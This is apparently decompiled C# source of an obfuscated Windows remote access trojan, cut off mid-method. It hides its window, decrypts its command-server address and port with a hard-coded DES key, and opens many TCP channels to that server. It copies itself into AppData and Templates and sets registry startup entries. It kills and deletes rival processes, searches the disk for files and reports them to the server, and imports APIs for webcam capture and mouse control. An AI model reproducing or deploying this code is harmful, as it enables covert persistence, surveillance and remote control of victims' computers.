using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Drawing.Printing;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using GHs4oIAglbclBqBUl2;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using lVTN0XbZQhK8P5SKQ4;
using ns0;
using ns1;

[DesignerGenerated]
public class cmtkt743 : Form
{
	private IContainer DJs7XmezHEeeN10;

	[AccessedThroughProperty("ServiceController1")]
	private ServiceController YecBwbwN35Tff11;

	private bool jUXDTAE81gVwy12;

	private bool PWIMcmLboEsBk13;

	private bool qjMADzRH3jB3L14;

	private int DzFXXg4YmA4gT15;

	private int xt3Ufv1yallrD16;

	private int lEQLD6IrIbvrG17;

	private int bxl3JHjJ2oD8318;

	private string string_0;

	private string YysOhyszktc7C20;

	private string E7TjgcDz0FegX21;

	private string cVmg7dsMJLhd622;

	private string string_1;

	private string VXmXSdykmxc3m24;

	private string ZEQVmB596X5e625;

	private int fUlxxUFXhvpLT26;

	private int int_0;

	private TcpClient Pv0OZhJLXDYOZ28;

	private NetworkStream inpI9qaswpmnO29;

	private StreamWriter OwUfdzNu4aWsv30;

	private StreamReader streamReader_0;

	private Process lzzj5DrbsdRIp32;

	private StringBuilder p1uddsfDi8lpm33;

	private int ysFPb7XFeeVL434;

	private int i1kFOfoDoTEL735;

	private long j2U2qdTI5YvD136;

	private short JLJbMzr99djCj37;

	private byte[] byte_0;

	private FileStream HRld2P2NwCUd639;

	private FileStream fileStream_0;

	private BinaryWriter uzXUQX0YRANWb41;

	private BinaryReader uAwzoOVsWJ6E542;

	private int aKGzZliCksPBM43;

	private long Xd8dJadD7PBzt44;

	private long bZXxQRfKNfiiA45;

	private string rDy98HXCRIkIZ46;

	private MessageBoxIcon Wrs2U5ZwaiFNB47;

	private MessageBoxButtons Xl19YPU9Iz4YH48;

	private string TBQjhCPRVOiKk49;

	private string ci3hlSmwJBBHK50;

	private string uOPdSn4dboFQ151;

	private Point point_0;

	private Rectangle bCba0fBw801IW53;

	private const int SC_SCREENSAVE = 61760;

	private const int HWND_BROADCAST = 65535;

	private const int WM_SYSCOMMAND = 274;

	public const long M = 1L;

	public const long MONITOR_ON = -1L;

	public const int MONITOR_OFF = 2;

	private const int SC_MONITORPOWER = 61808;

	private const short WM_CAP = 1024;

	private const int WM_CAP_COPY = 1054;

	private const int WM_CAP_DRIVER_CONNECT = 1034;

	private const int WM_CAP_DRIVER_DISCONNECT = 1035;

	private const int WM_CAP_EDIT_COPY = 1054;

	private const int WM_CAP_GET_FRAME = 1084;

	private int UG71UoqjQoLH454;

	private IDataObject Sj6RbJMDbs11n55;

	private Image peuUWIjAOIwBH56;

	private ManagementObjectSearcher H0UldpsVnipgP57;

	private string hViJd5ZwYbOWr58;

	private string string_2;

	private string Czs2W5D7rni5v60;

	private const int MOUSEEVENTF_ABSOLUTE = 32768;

	private const int MOUSEEVENTF_LEFTDOWN = 2;

	private const int MOUSEEVENTF_LEFTUP = 4;

	private const int MOUSEEVENTF_MOVE = 1;

	private const int MOUSEEVENTF_MIDDLEDOWN = 32;

	private const int MOUSEEVENTF_MIDDLEUP = 64;

	private const int MOUSEEVENTF_RIGHTDOWN = 8;

	private const int MOUSEEVENTF_RIGHTUP = 16;

	private string[] qBbJP5pMm4sjH61;

	private string[] O0kfayTYtq4Wf62;

	private string[] JijB0aY5aEjjW63;

	private Thread EqsfuZIegCNcd64;

	private string JcwXb6Nzl7tL465;

	private string[] hlBEm1VeUswdW66;

	private int[] int_1;

	private const long MB_DEFBUTTON1 = 0L;

	private const long MB_DEFBUTTON2 = 256L;

	private TcpClient cwnijYuqInCBg68;

	private NetworkStream LgZOJZJe2zxSr69;

	private StreamWriter XlhPz2rTPpQC970;

	private StreamReader yJvlQpRpK8NC271;

	private Thread zueaWPqR188SN72;

	private TcpClient zamWR8cArZJGJ73;

	private NetworkStream networkStream_0;

	private StreamWriter streamWriter_0;

	private StreamReader Eps8uuudGpOOV76;

	private Thread EFh7dHho60iUo77;

	private TcpClient mdHjk0nUPN4ks78;

	private NetworkStream aaekNtIFINLHt79;

	private StreamWriter lwTyp9d68gwn480;

	private StreamReader Oq0PRcMKw79Mc81;

	private Thread ObIDpVBQER1ho82;

	private TcpClient U6m2TIWIFhFTW83;

	private NetworkStream yVIPpJLcl1ovR84;

	private StreamWriter ALe9zZxthFoud85;

	private StreamReader rPu9T3KsnG8Pr86;

	private Thread hvbz5Xw28auvI87;

	private TcpClient FltgfjkciWIb788;

	private NetworkStream lLod56j8H2hIA89;

	private StreamWriter qXajE0DbnoZ6r90;

	private StreamReader OueYzsnXCLEU591;

	private Thread ncAYjbyETn2Zh92;

	private TcpClient HxWXmp6EiOTJs93;

	private NetworkStream OkDObwoyCrBo594;

	private StreamWriter NxMV7cYiLP0Ep95;

	private StreamReader eOr5nGfRme14b96;

	private Thread vBI56lzhBzRnH97;

	private TcpClient HKa3uC9MhA7w498;

	private NetworkStream V9eqiLQVGnzGJ99;

	private StreamWriter F58CezIGYuGjK100;

	private StreamReader oVpe1Ay1pp3bg101;

	private Thread thread_0;

	private TcpClient xOoWEx7ymU103;

	private NetworkStream wslY7HgG5r104;

	private StreamWriter YtbVX76VZs105;

	private StreamReader RLzG2KDtKv106;

	private Thread thread_1;

	private TcpClient Gnzdm4CtZx108;

	private NetworkStream qbzU2LSEVn109;

	private StreamWriter streamWriter_1;

	private StreamReader streamReader_1;

	private Thread thread_2;

	private TcpClient GnFRZTrZP5113;

	private NetworkStream j2MArWvD9y114;

	private StreamWriter ywlXfTiJuv115;

	private StreamReader streamReader_2;

	private Thread thread_3;

	private TcpClient mtF1U92IB5118;

	private NetworkStream BIvjWn2zSJ119;

	private StreamWriter streamWriter_2;

	private StreamReader voYl9FgYiy121;

	private Thread G6bQgkHdhg122;

	private TcpClient tcpClient_0;

	private NetworkStream aVprAcK9ah124;

	private StreamWriter streamWriter_3;

	private StreamReader FMQ18GnWku126;

	private Thread SStKoLGKg3127;

	private TcpClient Ax2Z9YyHX0128;

	private NetworkStream networkStream_1;

	private StreamWriter PNOFofAwVi130;

	private StreamReader kLAXz7JQSa131;

	private Thread thread_4;

	private TcpClient GismeNInAT133;

	private NetworkStream n1MFFnlpLL134;

	private StreamWriter Eew8M9Oujs135;

	private StreamReader KsFUC2idJL136;

	private Thread omgYM6TjFZ137;

	private TcpClient A4l5msLkA5138;

	private NetworkStream Ye489UmR3D139;

	private StreamWriter streamWriter_4;

	private StreamReader fvOjRF7zya141;

	private Thread gYDDNai7OR142;

	private TcpClient J2f1UtolJ4143;

	private NetworkStream ueYUQtpKht144;

	private StreamWriter NNjSn6u2cc145;

	private StreamReader ZQItWcfNoo146;

	private Thread hLQtG2ZJNk147;

	private TcpClient KxQl4WImEO148;

	private NetworkStream Zl9w5DvvXD149;

	private StreamWriter dClTc2WPck150;

	private StreamReader streamReader_3;

	private Thread tS8AoWCjo2152;

	private TcpClient wtMa67cW81153;

	private NetworkStream ZTajHe6g4D154;

	private StreamWriter D75W9ktLug155;

	private StreamReader qDraNDX4Lk156;

	private Thread f3en0AIOTa157;

	private TcpClient PleKopoP0M158;

	private NetworkStream DqsSBmrZv3159;

	private StreamWriter h1uKoASIWy160;

	private int BFSkq4oHLo161;

	private string f83YGOAlLE162;

	private Mutex mutex_0;

	private Thread wFTsaYy8sx164;

	private string XJd7O9Yw4z165;

	private bool bool_0;

	private bool dVlYSzeBNH167;

	private bool fsSeHpub1J168;

	private int PkoMNZJC3i169;

	private int CwGQj1offe170;

	private List<Rectangle> UnInjxEHzZ171;

	private int[] ob1HMTwzaS172;

	private string QCyv5JL2VG173;

	private int int_2;

	private int l123UrvZ4p175;

	private bool vP4moiOchA176;

	private string LBMTY8eeSj177;

	private int hu6UwOzuBE178;

	internal virtual ServiceController ServiceController1
	{
		get
		{
			return YecBwbwN35Tff11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			YecBwbwN35Tff11 = value;
		}
	}

	private string Manufacturer => hViJd5ZwYbOWr58;

	private string Model => string_2;

	private string WindowsDirectory => Czs2W5D7rni5v60;

	public cmtkt743()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_Shown((EventHandler)qfIHzN99);
		((Form)this).add_FormClosing(new FormClosingEventHandler(mEOJYWBob1YmS111));
		jUXDTAE81gVwy12 = false;
		DzFXXg4YmA4gT15 = 0;
		ysFPb7XFeeVL434 = 32768;
		i1kFOfoDoTEL735 = 65536;
		byte_0 = new byte[0];
		uOPdSn4dboFQ151 = Conversions.ToString(Environment.OSVersion.Version.Major);
		bCba0fBw801IW53 = Screen.get_PrimaryScreen().get_Bounds();
		JcwXb6Nzl7tL465 = "";
		hlBEm1VeUswdW66 = new string[4] { "Default", "90", "180", "270" };
		int_1 = new int[4] { 0, 1, 2, 3 };
		bool_0 = false;
		dVlYSzeBNH167 = false;
		fsSeHpub1J168 = false;
		checked
		{
			PkoMNZJC3i169 = (int)Math.Round((double)bCba0fBw801IW53.Width / 4.0);
			CwGQj1offe170 = (int)Math.Round((double)bCba0fBw801IW53.Height / 4.0);
			UnInjxEHzZ171 = new List<Rectangle>();
			ob1HMTwzaS172 = new int[17];
			QCyv5JL2VG173 = null;
			int_2 = 0;
			vP4moiOchA176 = false;
			mWrsVB86();
		}
	}

	[STAThread]
	public static void c2kLHo85()
	{
		Application.Run((Form)(object)new cmtkt743());
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		try
		{
			if (disposing && DJs7XmezHEeeN10 != null)
			{
				DJs7XmezHEeeN10.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void mWrsVB86()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		new ComponentResourceManager(typeof(cmtkt743));
		ServiceController1 = new ServiceController();
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		Padding margin = default(Padding);
		((Padding)(ref margin))._002Ector(18, 39, 18, 39);
		((Form)this).set_Margin(margin);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("MainFrm");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrReturnString, int uReturnLength, int hwndCallback);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SendMessageA(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName, int dwStyle, int x, int y, int nWidth, short nHeight, int hWndParent, int nID);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int mciExecute([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr hwnd, IntPtr hWndChild, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindow);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool IsWindowVisible(IntPtr hwnd);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long SwapMouseButton(long bSwap);

	private void qfIHzN99(object sender, EventArgs e)
	{
		try
		{
			GmhWc9n87GxDM122(5);
			mutex_0 = new Mutex(initiallyOwned: false, aSTHLgwCVFgaYszy7aDZ4p16.r5vsr64Ff4X8pIANuoCQob40());
			if (!mutex_0.WaitOne(0, exitContext: false))
			{
				mutex_0.Close();
				mutex_0 = null;
				ProjectData.EndApp();
			}
			((Control)this).set_Visible(false);
			string_1 = Jdo0DxwKuQHIp113(aSTHLgwCVFgaYszy7aDZ4p16.smethod_0(), "12345#$%");
			f83YGOAlLE162 = string_1;
			VXmXSdykmxc3m24 = Jdo0DxwKuQHIp113(aSTHLgwCVFgaYszy7aDZ4p16.smethod_1(), "12345#$%");
			fUlxxUFXhvpLT26 = aSTHLgwCVFgaYszy7aDZ4p16.wkRsWdecHeFLNrpFXk2YgL37();
			BFSkq4oHLo161 = fUlxxUFXhvpLT26;
			int_0 = aSTHLgwCVFgaYszy7aDZ4p16.ruA9By1TO86Ki0fKg8f3ts39();
			GmhWc9n87GxDM122(1);
			if ((Operators.CompareString(f83YGOAlLE162, (string)null, false) == 0) | (BFSkq4oHLo161 == 0))
			{
				Environment.Exit(0);
			}
			else
			{
				try
				{
					LEkxqRvvsnXZC109();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					Thread thread = new Thread(go1wnXFjUjhwD107);
					thread.Start();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				EqsfuZIegCNcd64 = new Thread(tQA0ZnTEdRCQz211);
				EqsfuZIegCNcd64.Start();
				try
				{
					Thread thread2 = new Thread(R16Y5r101);
					thread2.Start();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			bxl3JHjJ2oD8318 = ((Control)this).get_Handle().ToInt32();
			kgxHCA6DdN8PW151();
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			Environment.Exit(0);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("dnsapi.dll")]
	private static extern uint DnsFlushResolverCache();

	private void R16Y5r101()
	{
		while (true)
		{
			GmhWc9n87GxDM122(1800);
			try
			{
				if (!Pv0OZhJLXDYOZ28.Connected)
				{
					DnsFlushResolverCache();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	private string yUKeIL104()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	private void YwZ7q1105(object currentDirectory)
	{
		checked
		{
			try
			{
				if (!PWIMcmLboEsBk13)
				{
					return;
				}
				qBbJP5pMm4sjH61 = Directory.GetDirectories(Conversions.ToString(currentDirectory));
				O0kfayTYtq4Wf62 = Directory.GetFiles(Conversions.ToString(currentDirectory));
				string[] o0kfayTYtq4Wf = O0kfayTYtq4Wf62;
				foreach (string text in o0kfayTYtq4Wf)
				{
					if (JijB0aY5aEjjW63[1].StartsWith("*"))
					{
						string[] array = JijB0aY5aEjjW63[1].Split(new char[1] { '.' });
						if (text.EndsWith(array[array.Length - 1]))
						{
							streamWriter_2.WriteLine("/SEARCHFL/" + text + "¦" + Conversions.ToString(((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().GetFileInfo(text).Length));
							streamWriter_2.Flush();
						}
					}
					else
					{
						string[] array2 = text.Split(new char[1] { '\\' });
						if (array2[array2.Length - 1].Contains(JijB0aY5aEjjW63[1]))
						{
							streamWriter_2.WriteLine("/SEARCHFL/" + text + "¦" + Conversions.ToString(((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().GetFileInfo(text).Length));
							streamWriter_2.Flush();
						}
					}
				}
				string[] array3 = qBbJP5pMm4sjH61;
				foreach (string text2 in array3)
				{
					if (!(text2.Substring(3).StartsWith("WINDOWS") | text2.Substring(3).StartsWith("WINNT")))
					{
						YwZ7q1105(text2);
					}
				}
				qBbJP5pMm4sjH61 = null;
				if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(currentDirectory, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)3, false))
				{
					streamWriter_2.WriteLine("/SEARCHFL/SEARCHEND");
					streamWriter_2.Flush();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private ImageCodecInfo EqCed4lNA73fI106(string mimeType)
	{
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		int num = imageEncoders.Length;
		int num2 = 0;
		while (true)
		{
			if (num2 <= num)
			{
				if (Operators.CompareString(imageEncoders[num2].get_MimeType(), mimeType, false) == 0)
				{
					break;
				}
				num2 = checked(num2 + 1);
				continue;
			}
			return null;
		}
		return imageEncoders[num2];
	}

	private void go1wnXFjUjhwD107()
	{
		try
		{
			GmhWc9n87GxDM122(5);
			aLIJ7lIAL1N1F110();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private object ikZyrGAUwq4VY108(string ProcessName)
	{
		Process process = new Process();
		Process[] processesByName = Process.GetProcessesByName(ProcessName);
		IEnumerator enumerator = default(IEnumerator);
		for (int i = 0; i < processesByName.Length; i = checked(i + 1))
		{
			process = processesByName[i];
			try
			{
				try
				{
					enumerator = process.Modules.GetEnumerator();
					if (!enumerator.MoveNext())
					{
						continue;
					}
					ProcessModule processModule = (ProcessModule)enumerator.Current;
					return processModule.FileName!.ToString();
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		return null;
	}

	private void LEkxqRvvsnXZC109()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().GetFileInfo(Conversions.ToString(ikZyrGAUwq4VY108(process.ProcessName))).Length <= 100000L)
					{
						continue;
					}
					double num = double.Parse(FileVersionInfo.GetVersionInfo(Conversions.ToString(ikZyrGAUwq4VY108(process.ProcessName))).ProductVersion);
					if (num == 3.0 || num == 3.1 || num == 3.2 || num == 3.3 || num == 3.4 || num == 3.5)
					{
						try
						{
							process.Kill();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						GmhWc9n87GxDM122(2);
						try
						{
							((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().DeleteFile(Conversions.ToString(ikZyrGAUwq4VY108(process.ProcessName)));
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
					else if (num == 3.7)
					{
						Environment.Exit(0);
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void aLIJ7lIAL1N1F110()
	{
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath())))
			{
				try
				{
					byte[] array = ((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().ReadAllBytes(Application.get_ExecutablePath());
					try
					{
						((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\" + Path.GetFileName(Application.get_ExecutablePath()), array, false);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						GmhWc9n87GxDM122(1);
						ProjectData.ClearProjectError();
					}
					try
					{
						((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath()), array, false);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			GmhWc9n87GxDM122(2);
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath())) && Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Registry().get_CurrentUser().OpenSubKey(Jdo0DxwKuQHIp113(aSTHLgwCVFgaYszy7aDZ4p16.BaFdBu6AWKqZ2vD96UP8S241(), "12345#$%"), writable: false)!.GetValue(Jdo0DxwKuQHIp113(aSTHLgwCVFgaYszy7aDZ4p16.NaBwasDQqC3gtkNevzzE7c42(), "12345#$%")), (object)(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath())), false))))
				{
					((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Registry().get_CurrentUser().OpenSubKey(Jdo0DxwKuQHIp113(aSTHLgwCVFgaYszy7aDZ4p16.BaFdBu6AWKqZ2vD96UP8S241(), "12345#$%"), writable: true)!.SetValue(Jdo0DxwKuQHIp113(aSTHLgwCVFgaYszy7aDZ4p16.NaBwasDQqC3gtkNevzzE7c42(), "12345#$%"), Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath()));
				}
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			GmhWc9n87GxDM122(1);
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\" + Path.GetFileName(Application.get_ExecutablePath())) && Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Registry().get_CurrentUser().OpenSubKey(Jdo0DxwKuQHIp113(aSTHLgwCVFgaYszy7aDZ4p16.BaFdBu6AWKqZ2vD96UP8S241(), "12345#$%"), writable: false)!.GetValue(Jdo0DxwKuQHIp113(aSTHLgwCVFgaYszy7aDZ4p16.HqG59liI1fizmuC4kEX6jO43(), "12345#$%")), (object)(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\" + Path.GetFileName(Application.get_ExecutablePath())), false))))
				{
					((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Registry().get_CurrentUser().OpenSubKey(Jdo0DxwKuQHIp113(aSTHLgwCVFgaYszy7aDZ4p16.BaFdBu6AWKqZ2vD96UP8S241(), "12345#$%"), writable: true)!.SetValue(Jdo0DxwKuQHIp113(aSTHLgwCVFgaYszy7aDZ4p16.HqG59liI1fizmuC4kEX6jO43(), "12345#$%"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\" + Path.GetFileName(Application.get_ExecutablePath()));
				}
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
	}

	private void mEOJYWBob1YmS111(object sender, FormClosingEventArgs e)
	{
		try
		{
			aLIJ7lIAL1N1F110();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private string q07QX2zPwPcMi112(string strText, string strEncrKey)
	{
		byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(strEncrKey, 8));
			byte[] bytes2 = Encoding.UTF8.GetBytes(strText);
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateEncryptor(bytes, rgbIV), CryptoStreamMode.Write);
			cryptoStream.Write(bytes2, 0, bytes2.Length);
			cryptoStream.FlushFinalBlock();
			return Convert.ToBase64String(memoryStream.ToArray());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string Jdo0DxwKuQHIp113(string strText, string sDecrKey)
	{
		try
		{
			byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
			byte[] array = new byte[checked(strText.Length + 1)];
			byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(sDecrKey, 8));
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			array = Convert.FromBase64String(strText);
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(bytes, rgbIV), CryptoStreamMode.Write);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.FlushFinalBlock();
			Encoding uTF = Encoding.UTF8;
			return uTF.GetString(memoryStream.ToArray());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void method_0()
	{
		try
		{
			HRld2P2NwCUd639.Close();
			uAwzoOVsWJ6E542.Close();
			uzXUQX0YRANWb41 = null;
			fileStream_0 = null;
			uAwzoOVsWJ6E542 = null;
			HRld2P2NwCUd639 = null;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public bool LrQQPBXFdn0bn115(ref string FileName)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I4
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
				case 53:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 3:
							goto end_IL_0000_3;
						}
						goto default;
					}
					end_IL_0000_2:
					break;
				}
				num = 2;
				flag = (FileSystem.GetAttr(FileName) & 0x10) == 0;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 53;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		bool result = flag;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private string rP7Vap7x1aCy5116(ref string Temp)
	{
		try
		{
